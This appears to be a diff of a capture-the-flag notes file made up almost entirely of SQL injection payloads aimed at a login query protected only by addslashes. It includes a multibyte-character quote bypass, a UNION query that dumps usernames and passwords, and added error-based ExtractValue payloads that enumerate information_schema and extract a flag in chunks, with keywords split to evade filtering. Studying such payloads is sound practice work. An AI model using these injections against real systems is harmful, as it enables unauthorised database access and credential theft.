@@ -13,7 +13,14 @@ end
 
 
 SELECT * FROM users WHERE username='#{addslashes(@params['username'])}' and password='#{addslashes(@params['password'])}'
-¿'/**/||/**/10>9/**/--
+¿'/**/||/**/10=10/**/--
 PRINT ALL
 ¿') UNION ALL SELECT CONCAT(username, 0x3A, password) AS details FROM users LIMIT 0,1;
 ' or LEFT(flag,4)='FLAG' -- 
+
+
+\'||/**/ExtractValue(1,concat(0x7e,(s elect/**/table_name/**/FROM/**/info rmation_schema.tables/**/whe re/**/table_schema/**/in/**/(char(0x64,0x62))/**/limit/**/0,1)))#
+
+\'O R/**/ExtractValue(1,concat(0x7e,(s elect/**/substring(i_4m_th3_fl4g,1, 30)/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/limit/**/0,1),0x7e))#
+
+\'O R/**/ExtractValue(1,concat(0x7e,(s elect/**/substring(i_4m_th3_fl4g,31, 30)/**/FROM/**/`h3y_here_15_the_flag_y0u_w4nt,meow,flag`/**/limit/**/0,1),0x7e))#
